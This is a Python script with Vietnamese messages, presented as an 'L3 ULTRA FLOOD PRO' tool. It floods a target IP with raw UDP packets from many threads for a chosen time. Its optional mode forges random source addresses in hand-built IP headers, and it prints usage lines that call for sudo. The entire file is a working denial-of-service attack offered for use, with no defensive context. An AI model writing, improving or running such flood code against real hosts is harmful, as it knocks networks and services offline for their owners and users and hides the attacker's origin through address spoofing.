

import socket
import struct
import random
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor
import multiprocessing as mp

# ====================== CẤU HÌNH ======================
MAX_PACKET_SIZE = 1492
BURST_SIZE = 10000
# ====================================================

class Colors:
    GREEN = '\033[92m'; YELLOW = '\033[93m'; RED = '\033[91m'; CYAN = '\033[96m'; ENDC = '\033[0m'; BOLD = '\033[1m'

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Colors.CYAN}╔{'═' * 68}╗
║  {Colors.GREEN}L3 ULTRA FLOOD PRO – WIFI6 + SPOOF{Colors.CYAN}                         ║
║  {Colors.YELLOW}python3 script.py IP thời_gian luồng [--spoof]{Colors.CYAN}             ║
╚{'═' * 68}╝{Colors.ENDC}
    """)

def l3_flood(target_ip, duration, thread_id, spoof=False):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**24)
    except PermissionError:
        print(f"{Colors.RED}[T{thread_id}] LỖI: Cần sudo để gửi raw packet!{Colors.ENDC}")
        return
    except Exception as e:
        print(f"{Colors.RED}[T{thread_id}] Socket lỗi: {e}{Colors.ENDC}")
        return

    timeout = time.time() + duration
    sent = 0
    payload = random._urandom(MAX_PACKET_SIZE - 20)

    mode = "SPOOF" if spoof else "NO SPOOF"
    print(f"{Colors.GREEN}[T{thread_id}] {mode} → {target_ip}{Colors.ENDC}")

    while time.time() < timeout:
        try:
            for _ in range(BURST_SIZE):
                if spoof:
                    # === GIẢ MẠO IP ===
                    src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                else:
                    # === DÙNG IP THẬT ===
                    src_ip = socket.gethostbyname(socket.gethostname())

                src_addr = socket.inet_aton(src_ip)
                dst_addr = socket.inet_aton(target_ip)

                ip_header = struct.pack('!BBHHHBBH4s4s',
                    0x45, 0, MAX_PACKET_SIZE, random.randint(1,65535), 0, 64,
                    socket.IPPROTO_UDP, 0, src_addr, dst_addr)

                packet = ip_header + payload
                sock.sendto(packet, (target_ip, 0))
                sent += 1

            if sent % 100000 == 0:
                print(f"{Colors.YELLOW}[T{thread_id}] Gửi {sent:,} gói...{Colors.ENDC}")

        except:
            time.sleep(0.001)

    sock.close()
    print(f"{Colors.GREEN}[T{thread_id}] Xong! Gửi {sent:,} gói.{Colors.ENDC}")

def main():
    # Kiểm tra cú pháp
    spoof = False
    if len(sys.argv) < 4 or len(sys.argv) > 5:
        print(f"{Colors.RED}CÚ PHÁP SAI!{Colors.ENDC}")
        print(f"{Colors.YELLOW}DÙNG:{Colors.ENDC}")
        print(f"  {Colors.CYAN}python3 {sys.argv[0]} <IP> <thời_gian> <luồng>{Colors.ENDC}")
        print(f"  {Colors.CYAN}sudo python3 {sys.argv[0]} <IP> <thời_gian> <luồng> --spoof{Colors.ENDC}")
        sys.exit(1)

    # Xử lý --spoof
    if len(sys.argv) == 5:
        if sys.argv[4] == "--spoof":
            spoof = True
        else:
            print(f"{Colors.RED}Tham số không hợp lệ: {sys.argv[4]}{Colors.ENDC}")
            sys.exit(1)

    target_ip = sys.argv[1]
    try:
        duration = int(sys.argv[2])
        threads = int(sys.argv[3])
    except:
        print(f"{Colors.RED}Thời gian và luồng phải là số!{Colors.ENDC}")
        sys.exit(1)

    if duration <= 0 or threads <= 0:
        print(f"{Colors.RED}Thời gian và luồng phải > 0!{Colors.ENDC}")
        sys.exit(1)

    print_banner()
    print(f"""
{Colors.CYAN}MỤC TIÊU: {target_ip}
THỜI GIAN: {duration}s
LUỒNG: {threads}
CHẾ ĐỘ: {'SPOOF (cần sudo)' if spoof else 'NO SPOOF (an toàn)'}
{Colors.ENDC}""")

    if spoof:
        print(f"{Colors.RED}CẢNH BÁO: Đang dùng --spoof → CẦN CHẠY VỚI sudo!{Colors.ENDC}")
    input(f"{Colors.YELLOW}Nhấn Enter để bắt đầu...{Colors.ENDC}")

    start = time.time()
    print(f"{Colors.GREEN}BẮT ĐẦU GỬI {threads} LUỒNG...{Colors.ENDC}\n")

    with ThreadPoolExecutor(max_workers=threads) as pool:
        for i in range(threads):
            pool.submit(l3_flood, target_ip, duration, i, spoof)

    total_time = time.time() - start
    print(f"\n{Colors.GREEN}HOÀN THÀNH! Thời gian: {total_time:.2f}s{Colors.ENDC}")
    print(f"{Colors.YELLOW}Kiểm tra router: WiFi có lag? Có cần reset?{Colors.ENDC}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Dừng bởi bạn (Ctrl+C).{Colors.ENDC}")